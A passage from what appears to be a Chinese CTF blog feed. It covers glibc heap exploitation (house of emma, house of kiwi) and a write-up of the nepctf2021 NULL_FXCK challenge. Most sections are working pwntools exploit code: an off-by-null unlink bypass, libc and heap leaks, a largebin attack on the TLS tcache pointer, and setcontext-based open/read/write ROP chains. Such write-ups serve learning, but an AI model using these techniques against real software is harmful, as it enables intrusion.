class="comment"># ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">orw = flat(pop_rdi,srop_adr+0xf8,pop_rsi,0,op,</span></span><br><span class="line"><span class="string">pop_rdi,3,pop_rsi,srop_adr+0x200,pop_rdx_rbx,0x100,0,re,</span></span><br><span class="line"><span class="string">pop_rdi,1,pop_rsi,srop_adr+0x200,pop_rdx_rbx,0x40,0,wr</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x446c0</span></span><br><span class="line">syscall = libc_base + <span class="number">0x883b6</span></span><br><span class="line">orw = [</span><br><span class="line">    pop_rax,  <span class="comment"># sys_open(&#x27;flag&#x27;, 0)</span></span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    syscall,</span><br><span class="line"> </span><br><span class="line">    pop_rax,  <span class="comment"># sys_read(flag_fd, heap, 0x100)</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    srop_adr + <span class="number">0x200</span>,</span><br><span class="line">    syscall,</span><br><span class="line"> </span><br><span class="line">    pop_rax,  <span class="comment"># sys_write(1, heap, 0x100)</span></span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    srop_adr + <span class="number">0x200</span>,</span><br><span class="line">    syscall</span><br><span class="line">]</span><br><span class="line"><span class="comment">#执行gadget_adr  rdx = rdi+8 </span></span><br><span class="line">pay = p64(<span class="number">0</span>) + p64(srop_adr) <span class="comment">#rdx=srop_adr</span></span><br><span class="line"><span class="comment">#然后call rdx+0x20 --&gt; sentcontext+61</span></span><br><span class="line">pay += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span> + p64(setcontext_addr+<span class="number">61</span>) <span class="comment">#p64(srop_adr+0xf8+0x10) #</span></span><br><span class="line"><span class="comment">#rsp = rdx + 0xa0</span></span><br><span class="line">pay += <span class="built_in">bytes</span>(frame).ljust(<span class="number">0xF8</span>, <span class="string">b&#x27;\x00&#x27;</span>)[<span class="number">0x28</span>:]+<span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)+flat(orw)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = edit(<span class="number">0</span>,fake_io) + edit(<span class="number">1</span>,pay) + add(<span class="number">8</span>,<span class="number">0x450</span>) + p8(<span class="number">5</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Pls input the opcode&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;flag&#x27;)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="IO流程"><a href="#IO流程" class="headerlink" title="IO流程"></a>IO流程</h4><p>从__malloc_assert开始</p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859327628-fc5d1ec6-a292-4c1a-9d75-8cec668d7fa6.png" alt="img"><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859355835-d4566192-9b27-4cdb-8eb5-a51dade45d46.png" alt="img"><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859367837-4e98c44c-f4c8-4dd6-9f40-6227408f2036.png" alt="img">rbx &#x3D; stderr<br><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859106777-98a8534b-15b0-4cdb-bc2b-e12fa7c6b245.png" alt="img">rdi &#x3D; rbx+0x88<br><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859137550-85753577-6e33-4eb9-9528-42dd452c25c9.png" alt="img"><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859456663-ccf89fde-dabc-4f30-b7a2-1714c1e7bb41.png" alt="img"><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859473694-5df965d9-0c93-4a05-ab91-088c2170462f.png" alt="img"><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859493272-e3ec584b-a4d2-426a-84f2-82f44c330885.png" alt="img">下面图中rbx就是我们伪造的跳表地址<img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694859531663-4c4719ba-2ede-4b0b-b0ea-c94eddcdc341.png" alt="img">进入_IO_cookie_write后就是rdi+0xf0，当然有    检测<img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694860262323-4922f196-d243-4d6e-93df-652d9c47e286.png" alt="img">在rdi (chunk0) +8 位置存放 chunk1 地址，然后chunk1+0x20放入setcontext 同时利用frame来布置栈空间，就可以控制程序流了<br><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694860328069-13f93d60-92b1-41c3-8cc2-1354c91baf65.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house-of-wiki学习以及复现</title>
      <link href="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h3><p>提供了另一种刷新IO方式：<code>__malloc_assert</code>     </p><span id="more"></span><h4 id="1、setcontext-61的gadget"><a href="#1、setcontext-61的gadget" class="headerlink" title="1、setcontext+61的gadget"></a>1、setcontext+61的gadget</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">68</span>&gt;:    mov    rbx,QWORD PTR [rdx+<span class="number">0x80</span>]</span><br><span class="line">&lt;setcontext+<span class="number">75</span>&gt;:    mov    rbp,QWORD PTR [rdx+<span class="number">0x78</span>]</span><br><span class="line">&lt;setcontext+<span class="number">79</span>&gt;:    mov    r12,QWORD PTR [rdx+<span class="number">0x48</span>]</span><br><span class="line">&lt;setcontext+<span class="number">83</span>&gt;:    mov    r13,QWORD PTR [rdx+<span class="number">0x50</span>]</span><br><span class="line">&lt;setcontext+<span class="number">87</span>&gt;:    mov    r14,QWORD PTR [rdx+<span class="number">0x58</span>]</span><br><span class="line">&lt;setcontext+<span class="number">91</span>&gt;:    mov    r15,QWORD PTR [rdx+<span class="number">0x60</span>]</span><br><span class="line">&lt;setcontext+<span class="number">95</span>&gt;:    test   DWORD PTR fs:<span class="number">0x48</span>,<span class="number">0x2</span></span><br><span class="line">&lt;setcontext+<span class="number">107</span>&gt;:    je     <span class="number">0x7ffff7e31156</span> &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line">&lt;setcontext+<span class="number">294</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">301</span>&gt;:    push   rcx</span><br><span class="line">&lt;setcontext+<span class="number">302</span>&gt;:    mov    rsi,QWORD PTR [rdx+<span class="number">0x70</span>]</span><br><span class="line">&lt;setcontext+<span class="number">306</span>&gt;:    mov    rdi,QWORD PTR [rdx+<span class="number">0x68</span>]</span><br><span class="line">&lt;setcontext+<span class="number">310</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0x98</span>]</span><br><span class="line">&lt;setcontext+<span class="number">317</span>&gt;:    mov    r8,QWORD PTR [rdx+<span class="number">0x28</span>]</span><br><span class="line">&lt;setcontext+<span class="number">321</span>&gt;:    mov    r9,QWORD PTR [rdx+<span class="number">0x30</span>]</span><br><span class="line">&lt;setcontext+<span class="number">325</span>&gt;:    mov    rdx,QWORD PTR [rdx+<span class="number">0x88</span>]</span><br><span class="line">&lt;setcontext+<span class="number">332</span>&gt;:    xor    eax,eax</span><br><span class="line">&lt;setcontext+<span class="number">334</span>&gt;:    ret</span><br></pre></td></tr></table></figure><p>主要关注的就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+<span class="number">61</span>&gt;:    mov    rsp,QWORD PTR [rdx+<span class="number">0xa0</span>]</span><br><span class="line">&lt;setcontext+<span class="number">294</span>&gt;:    mov    rcx,QWORD PTR [rdx+<span class="number">0xa8</span>]</span><br><span class="line">&lt;setcontext+<span class="number">301</span>&gt;:    push   rcx</span><br></pre></td></tr></table></figure><p>布置好rdx+0xa0 以及 rdx+0xa8 也就控制了rsp，后续ret就可以控制程序流了</p><h4 id="2、IO"><a href="#2、IO" class="headerlink" title="2、IO"></a>2、IO</h4><p>也是这周刚好参加国资社畜师傅的课，对IO了解的更详细些，这里是利用<code>_malloc_assert</code>去调用fflush函数，也就会执行跳表中的<code>__sync</code>指针</p><h4 id="3、house-of-kiwi"><a href="#3、house-of-kiwi" class="headerlink" title="3、house of kiwi"></a>3、house of kiwi</h4><p>因为进入IO的<code>__sync</code>之后会发现rdx固定为_IO_helper_jumps，所以控制<code>_IO_helper_jumps+0xa0、_IO_helper_jumps+0xa8</code>去调用setcontext+61就可以控制程序流<img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694530611129-f5b45f8c-06f9-4a13-8334-f353c3b1060b.png" alt="img"></p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>1、能够触发<code>__malloc_assert</code>     (top_chunk不满足申请内存的size)<br>2、能够任意写,修改_IO_file_sync和IO_helper_jumps + 0xA0 and 0xA8<br>将__sync中地址修改为setcontext+61，将IO_helper_jumps+0xa0 和 +0xa8分别修改为orw和ret地址</p><h3 id="nepctf2021-NULL-FXCK"><a href="#nepctf2021-NULL-FXCK" class="headerlink" title="[nepctf2021]NULL_FXCK"></a>[nepctf2021]NULL_FXCK</h3><p>参考博客：</p><p><a href="https://functionmain.gitee.io/2022/08/06/house-of-kiwi/">house of kiwi | Fang’s Blog!</a></p><p>[<a href="https://bbs.pediy.com/thread-273746.htm">原创]从PWN题NULL_FXCK中学到的glibc知识</a></p><p>2.32 菜单堆题  沙盒禁用execv、保护全开  全是新知识 猛猛学</p><h4 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h4><p>进入菜单前：相当于ban掉了malloc_hook 以及 free_hook<img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694352231065-9f9871ad-3454-402a-9808-d99977cd3b22.png" alt="img"><br>add：申请大小 0x100~0x2000，输入会在最后做截断，没有溢出、也不能去连带打印chunk中内容<img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694352599816-c65e9522-ea1a-4426-8ac4-87eea9dd5a0a.png" alt="img"><br>Modify：(edit)存在off-by-null<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694352682459-59e13698-a00c-4b2b-8792-76a7e6b3f054.png" alt="img"><br>delete：没有uaf漏洞<br>show：虽然用的write打印，但strlen是会截断00的<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497709811-420053c2-c003-4926-9c3d-47a469d60404.png" alt="img"></p><h4 id="思路及过程（学习其他师傅wp）"><a href="#思路及过程（学习其他师傅wp）" class="headerlink" title="思路及过程（学习其他师傅wp）"></a>思路及过程（学习其他师傅wp）</h4><h5 id="堆风水绕过unlink检查"><a href="#堆风水绕过unlink检查" class="headerlink" title="堆风水绕过unlink检查"></a>堆风水绕过unlink检查</h5><p>这题ban了hook、还禁用了execve 只能打orw，所以需要去控制程序流<br>有off-by-null，第一反应是去修改size然后unlink，不过没有uaf漏洞，这里就是考验极致的堆布置能力了。<br>首先是目的就是绕过unlink的检查：bck-&gt;fd &#x3D;&#x3D; P ；fwd-&gt; &#x3D;&#x3D;P ,以及要chunksize(P) &#x3D;&#x3D; pre_size<br>当我们连续放入三个chunk时，中间的chunk1的fd、bk就布置好了，关键就在于chunk0的fd以及chunk2的bk</p><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694354741682-2f458e3c-087d-4632-8c06-336eb8f1beb0.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#这里多个chunk是为后续准备的</span><br><span class="line">add(<span class="number">0x418</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">0x1f8</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">0x428</span>)#<span class="number">2</span>与chunk3合并，维护原chunk3的fd、bk</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x438</span>)</span>#3</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x208</span>)</span>#4</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x428</span>)</span>#5</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x208</span>)</span>#6</span><br><span class="line">#三链 chunk3 fd--&gt; chunk</span><br><span class="line"><span class="title function_">delete</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line"><span class="title function_">delete</span><span class="params">(<span class="number">3</span>)</span></span><br><span class="line"><span class="title function_">delete</span><span class="params">(<span class="number">5</span>)</span></span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694486565866-5fa10797-702a-4b98-9d2a-425c475494ff.png" alt="img"></p><p>因为只能通过add以及delete去修改堆中的内容，所以原chunk1肯定是不能去动的，这里巧妙的在chunk1上方多申请了一块chunk1_up，将这两块地址free合并再切割将原chunk1的fd、bk放到新chunk1_up的底部，当然为了后续操作方便，这里chunk大小的设置将chunk1的地址控制为00结尾，之后就可以将新chunk1地址链入chunk0 bk、chunk2 fd，然后修改末字节就可以达到目的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)<span class="comment">#会和chunk3 合并 (0x430+0x440 = 0x870)</span></span><br><span class="line"><span class="comment">#修改原chunk3的size、为之后unlink准备</span></span><br><span class="line"><span class="comment">#同时会将chunk0、chunk5放入largebin</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x428</span>+p64(<span class="number">0xc91</span>)</span><br><span class="line">add(<span class="number">0x440</span>,pay)<span class="comment">#切割chunk2、3合并chunk0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#chunk2、chunk3剩下部分2</span></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#chunk03</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>)<span class="comment">#chunk55</span></span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694487283661-66ecd78a-0379-464b-b1d9-2632c673b390.png" alt="img"></p><p>然后修改chunk0的bk、将新chunk1链入到chunk0，然后利用add中的截断去修改末字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改原chunk0的bk</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk0 --&gt;bk chunk3+0x20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)<span class="comment">#原chunk02</span></span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694488512485-ccde19d4-3b96-462a-9ed3-cf297f9da4f4.png" alt="img"></p><p>然后同样的去修改chunk2的bk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>)<span class="comment">#原chunk3+0x203</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk5 --&gt;fd chunk3+0x20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把原chunk5以及chunk3+0x20放入largebin</span></span><br><span class="line"><span class="comment">#这里是因为从unsortedbin中取出的话，fd、bk会被修改</span></span><br><span class="line">add(<span class="number">0x9f8</span>)<span class="comment">#为unlink准备3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk5 --&gt;nextsize_fd chunk3+0x20</span></span><br><span class="line"><span class="string">原chunk5 --&gt;nextsize_bk chunk3+0x20</span></span><br><span class="line"><span class="string">chunk3+0x20 --&gt;nextsize_fd 原chunk5</span></span><br><span class="line"><span class="string">chunk3+0x20 --&gt;nextsize_bk 原chunk5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#chunk5--&gt;fd 原chunk35</span></span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694488980270-b99a85bc-6ead-4ed7-9e20-7be02d6de57b.png" alt="img"></p><p>然后就可以修改pre_size 触发unlink，实现堆覆盖</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改chunk7的pre_size=0xc90,size=0xa00</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span> + p64(<span class="number">0xc90</span>) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#原chunk3+0x207</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#防止top_chukn合并8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里3实际是原chunk7位置，向上合并到原chunk3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fd : 原chunk5 --&gt; 原chunk3 --&gt; 原chunk0  </span></span><br><span class="line"><span class="string">bk : 原chunk0 --&gt; 原chunk3 --&gt; 原chunk5 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">delete(<span class="number">3</span>)<span class="comment">#---------unlink</span></span><br></pre></td></tr></table></figure><p>pre_size in_use位 chunk的fd、bk都准备好了<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694489537042-9525e192-ff6a-4ad3-bf51-eac10a5cef4d.png" alt="img"><br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694489562546-34e18b87-5c0e-456f-b9da-cb9a5e4fcd91.png" alt="img"><br>unlink成功<br>后面截图地址与上面有偏差，一步步调到add(0x208)就断了 但直接断在后面就没问题 不清楚为什么qwq）<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694489726963-7660ba22-d617-42c4-84c8-1cbf54a97e3e.png" alt="img"></p><h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>有了堆重叠，但地址还没泄露的，直接show的话末地址为00，泄露不出来，放入largebin再泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pay = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#伪造原chunk3+0x20的size、同时chunk4的fd、bk会放入main_arena+xxx</span></span><br><span class="line">add(<span class="number">0x430</span>,pay) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#将合并后的chunk放入largebin 然后就可以泄露地址了</span></span><br><span class="line">add(<span class="number">0x1600</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1680</span>-<span class="number">0x1e3ba0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base---&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_adr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_adr---&gt;&quot;</span>+<span class="built_in">hex</span>(heap_adr))</span><br></pre></td></tr></table></figure><h5 id="任意地址写入的实现"><a href="#任意地址写入的实现" class="headerlink" title="任意地址写入的实现"></a>任意地址写入的实现</h5><p>现在虽然有了堆重叠，但chunk大小不能用到tcache bin，所以没办法任意地址写入，这里师傅提供了一种新方式，tcachebin会有一块存tcache struct的chunk，也就是heap_base的，而这块地址是存在TSL段的一块地址上<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694495742516-01c61eb5-6e35-4502-abfa-d8cc867b3636.png" alt="img"><br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694495849133-e002c717-c396-43d3-9ce9-98369d55de9a.png" alt="img"><br>所以只要劫持该指针为我们可控制地址，就可以控制tcache，也就可以任意地址写入了<br>这里利用largebin attack向该指针写入堆块地址就可以了<br>这里提前在heap_adr+0x8e0处写入了 orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x428</span>+p64(<span class="number">0x211</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0xa01</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,pay)<span class="comment">#取走largebin10</span></span><br><span class="line"><span class="comment"># 在heap_adr + 0x8e0 处放入orw</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,orw)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#防止合并12</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#chunk4也是合并之后剩下的部分 size=0x1251</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过之前的unlink达到的堆覆盖去修改chunk5的 nextsize_bk</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap_adr+<span class="number">0x1350</span>)+p64(TLS-<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,pay)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#----------largebin attack 5</span></span><br><span class="line"><span class="comment">#向TLS写入了11的地址</span></span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694496318318-e68d432a-696f-408f-83d9-3f5ee5dd8704.png" alt="img"><br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694496433003-cbe664e0-836e-4b2c-8ba2-ecb9edc44398.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694496472851-8528c27d-9666-4c67-8145-8ffd42ce9aa4.png" alt="img"></p><p>但是在gdb中查看不到，写好偏移，然后走house of kiwi就可以执行orw了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span 